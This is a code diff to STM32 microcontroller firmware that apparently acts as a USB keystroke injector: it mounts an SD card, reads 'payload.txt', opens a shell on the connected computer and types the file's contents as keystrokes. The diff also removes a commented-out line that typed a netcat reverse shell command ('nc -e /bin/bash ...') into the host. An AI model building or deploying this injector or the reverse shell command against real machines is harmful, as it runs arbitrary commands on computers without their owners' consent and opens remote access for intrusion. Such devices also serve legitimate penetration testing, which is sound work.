@@ -2,6 +2,7 @@
 #include "fatfs.h"
 #include "file_handling.h"
 #include "usb_device.h"
+#include "ff.h"
 
 
 SD_HandleTypeDef hsd;
@@ -9,6 +10,7 @@ SD_HandleTypeDef hsd;
 void SystemClock_Config(void);
 static void MX_GPIO_Init(void);
 static void MX_SDIO_SD_Init(void);
+void flashLED();
 
 
 int main(void) {
@@ -20,21 +22,25 @@ int main(void) {
   MX_SDIO_SD_Init();
   MX_USB_DEVICE_Init();
   MX_FATFS_Init();
+  int8_t flag = 0;
+  char* buffer = (char*) calloc(BUFFER_SIZE, sizeof(char));
 
-  // HAL_Delay(2000);
-  // openShell();
-  // typeString("nc -e /bin/bash 127.0.0.1 4567 >/dev/null 2>&1 &\ndisown %1\n");
-  // closeShell();
+  HAL_Delay(2000);
 
-  mount_sd();
-  create_file("test.txt");
-  // Format_SD();
-  // Create_File("FILE1.TXT");
-  // Create_File("FILE2.TXT");
-  // Unmount_SD("/");
+  if (mount_sd() == FR_OK)  {
+    read_file("payload.txt", buffer); 
+    unmount_sd();
+    openShell();
+    typeString(buffer);
+    closeShell();
+    flag = 1;
+  }
+  free(buffer);
 
   while (1) {
-    flashLED();
+    if (flag == 1) {
+      flashLED();
+    }
     HAL_Delay(1000);
   }
 }
@@ -85,7 +91,7 @@ static void MX_SDIO_SD_Init(void) {
   hsd.Init.ClockPowerSave = SDIO_CLOCK_POWER_SAVE_DISABLE;
   hsd.Init.BusWide = SDIO_BUS_WIDE_1B;
   hsd.Init.HardwareFlowControl = SDIO_HARDWARE_FLOW_CONTROL_DISABLE;
-  hsd.Init.ClockDiv = 5;
+  hsd.Init.ClockDiv = 12;
   if (HAL_SD_Init(&hsd) != HAL_OK) {
     Error_Handler();
   }
